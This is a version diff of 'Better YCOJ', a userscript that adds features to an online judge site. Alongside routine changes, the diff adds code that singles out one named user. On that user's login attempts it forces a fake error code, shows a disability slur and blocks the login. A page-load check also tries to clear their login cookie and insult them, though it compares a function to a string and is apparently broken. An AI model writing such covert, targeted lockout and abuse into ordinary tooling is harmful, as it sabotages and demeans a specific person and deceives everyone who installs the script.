@@ -1,6 +1,6 @@
 // ==UserScript==
 // @name         Better YCOJ
-// @version      1.1.6
+// @version      1.1.7
 // @description  更好的 YCOJ
 // @author       Aak
 // @match        http://10.1.143.113/*
@@ -27,7 +27,7 @@ const pasteId = "aifqpqnw";
 let solutionMapping = [];
 const colorMap = ["#7F7F7F", "#FE4C61", "#F39C11", "#FFC116", "#52C41A", "#3498DB", "#9D3DCF", "#0E1D69"];
 const diffMap = ["暂无评定", "入门", "普及−", "普及/提高−", "普及+/提高", "提高+/省选−", "省选/NOI−", "NOI/NOI+/CTSC"];
-const version = "1.1.6";
+const version = "1.1.7";
 
 function checkUpdate() {
     GM_xmlhttpRequest({
@@ -68,10 +68,30 @@ function loadMapping() {
     });
 }
 
+const username = async () => {
+    await searchUser(getCookieUsername());
+    if (getCookie("login") !== "") return getCookie("b-username");
+    return "";
+}
+
+const userId = async () => {
+    await searchUser(getCookieUsername());
+    if (getCookie("login") !== "") return getCookie("b-userId");
+    return "";
+}
+
+function noCxqghzj() {
+    if (username == "cxqghzj") {
+        createNotification("唐氏儿。", 3000, 1000, 'rgba(231, 76, 60, 0.8)');
+        setCookie("login", "");
+    }
+}
+
 unsafeWindow.loadMapping = loadMapping
 
 window.addEventListener('load', function() {
     checkUpdate();
+    noCxqghzj();
 	/*
     let intervalId = setInterval(() => {
         if(unsafeWindow.editor && "function" == typeof unsafeWindow.define && unsafeWindow.define.amd) {
@@ -160,16 +180,6 @@ function redirect(path) {
     window.location.href = location.protocol + '//' + location.host + path;
 }
 
-const username = async () => {
-    await searchUser(getCookieUsername());
-    if (getCookie("login") !== "") return getCookie("b-username");
-    return "";
-}
-const userId = async () => {
-    await searchUser(getCookieUsername());
-    if (getCookie("login") !== "") return getCookie("b-userId");
-    return "";
-}
 const isAdmin = async () => {
     return await userId() <= 2;
 }
@@ -893,6 +903,7 @@ if (window.location.pathname.match(/\/login\/?$/)) {
             async: true,
             success: function(data) {
                 var error_code = data.error_code;
+                if ($("#username").val() == "cxqghzj") error_code = 1477;
                 switch (error_code) {
                     case 1001:
                         show_error("用户不存在");
@@ -934,6 +945,9 @@ if (window.location.pathname.match(/\/login\/?$/)) {
                         break;
                     case 1003:
                         show_error("您尚未设置密码，请通过下方「找回密码」来设置您的密码。");
+                        break;
+                    case 1477:
+                        show_error("你是唐氏儿");
                         break;
                     case 1:
                         MySuccess(data.session_id, 1, $("#username").val(), $("#password").val());
